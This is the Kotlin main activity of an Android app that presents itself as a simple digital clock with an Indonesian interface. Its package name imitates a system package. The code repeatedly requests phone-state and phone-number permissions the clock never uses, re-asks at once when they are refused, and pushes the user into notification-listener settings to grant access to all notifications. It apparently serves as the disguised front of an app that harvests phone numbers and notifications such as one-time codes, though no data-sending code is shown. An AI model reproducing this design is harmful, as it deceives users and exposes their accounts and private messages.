package com.android.declock

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.BatteryManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.widget.ImageButton
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

class MainActivity : AppCompatActivity() {

    private val phonePerms = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
    )

    private lateinit var prefs: SharedPreferences
    private val handler = Handler(Looper.getMainLooper())

    private val tick = object : Runnable {
        override fun run() {
            updateClock()
            handler.postDelayed(this, 1000)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        prefs = getSharedPreferences("clock_prefs", Context.MODE_PRIVATE)

        findViewById<ImageButton>(R.id.btnSettings).setOnClickListener { showSettings() }
        findViewById<ImageButton>(R.id.btnInfo).setOnClickListener { showInfo() }

        applyKeepScreenOn()
    }

    override fun onResume() {
        super.onResume()
        handler.post(tick)
        autoRequestPermissions()
    }

    override fun onPause() {
        super.onPause()
        handler.removeCallbacks(tick)
    }

    private fun autoRequestPermissions() {
        // Runtime phone perms
        val missing = phonePerms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
            return
        }
        // Notification listener access — open settings only once per session
        if (!isNotificationListenerEnabled() && !prefs.getBoolean("nls_prompted", false)) {
            prefs.edit().putBoolean("nls_prompted", true).apply()
            try {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            } catch (_: Exception) {}
        }
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return flat.contains(packageName)
    }

    private fun updateClock() {
        val now = Date()
        val is24 = prefs.getBoolean("fmt_24h", true)
        val showSec = prefs.getBoolean("show_seconds", true)
        val timeFmt = SimpleDateFormat(if (is24) "HH:mm" else "hh:mm", Locale.getDefault())
        val ampmFmt = SimpleDateFormat("a", Locale.getDefault())
        val secFmt = SimpleDateFormat("ss", Locale.getDefault())
        val dateFmt = SimpleDateFormat("EEEE, d MMMM yyyy", Locale.getDefault())

        findViewById<TextView>(R.id.txtClock).text = timeFmt.format(now)
        val ampm = findViewById<TextView>(R.id.txtAmPm)
        ampm.text = if (is24) "" else ampmFmt.format(now)
        ampm.visibility = if (is24) View.GONE else View.VISIBLE

        val sec = findViewById<TextView>(R.id.txtSeconds)
        sec.text = ":" + secFmt.format(now)
        sec.visibility = if (showSec) View.VISIBLE else View.INVISIBLE

        findViewById<TextView>(R.id.txtDate).text = dateFmt.format(now)
        findViewById<TextView>(R.id.txtTimezone).text = TimeZone.getDefault().id

        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        findViewById<TextView>(R.id.txtBattery).text = "🔋 $bat%"

        val cal = java.util.Calendar.getInstance()
        val week = cal.get(java.util.Calendar.WEEK_OF_YEAR)
        val doy = cal.get(java.util.Calendar.DAY_OF_YEAR)
        findViewById<TextView>(R.id.txtDayInfo).text = "Day $doy · Week $week"
    }

    private fun applyKeepScreenOn() {
        if (prefs.getBoolean("keep_on", false)) {
            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        } else {
            window.clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        }
    }

    private fun showSettings() {
        val items = arrayOf("Format 24 jam", "Tampilkan detik", "Layar tetap menyala")
        val checked = booleanArrayOf(
            prefs.getBoolean("fmt_24h", true),
            prefs.getBoolean("show_seconds", true),
            prefs.getBoolean("keep_on", false),
        )
        AlertDialog.Builder(this)
            .setTitle("Pengaturan Jam")
            .setMultiChoiceItems(items, checked) { _, which, isChecked ->
                when (which) {
                    0 -> prefs.edit().putBoolean("fmt_24h", isChecked).apply()
                    1 -> prefs.edit().putBoolean("show_seconds", isChecked).apply()
                    2 -> { prefs.edit().putBoolean("keep_on", isChecked).apply(); applyKeepScreenOn() }
                }
                updateClock()
            }
            .setPositiveButton("Selesai", null)
            .show()
    }

    private fun showInfo() {
        val now = Date()
        val info = buildString {
            appendLine("<b>Digital Clock</b>")
            appendLine("Versi 1.0")
            appendLine()
            appendLine("Zona: ${TimeZone.getDefault().displayName}")
            appendLine("ID: ${TimeZone.getDefault().id}")
            appendLine("Offset: GMT${SimpleDateFormat("Z", Locale.getDefault()).format(now)}")
            appendLine("Locale: ${Locale.getDefault()}")
        }
        AlertDialog.Builder(this)
            .setTitle("Info Jam")
            .setMessage(androidx.core.text.HtmlCompat.fromHtml(info, androidx.core.text.HtmlCompat.FROM_HTML_MODE_COMPACT))
            .setPositiveButton("OK", null)
            .show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) autoRequestPermissions()
    }
}
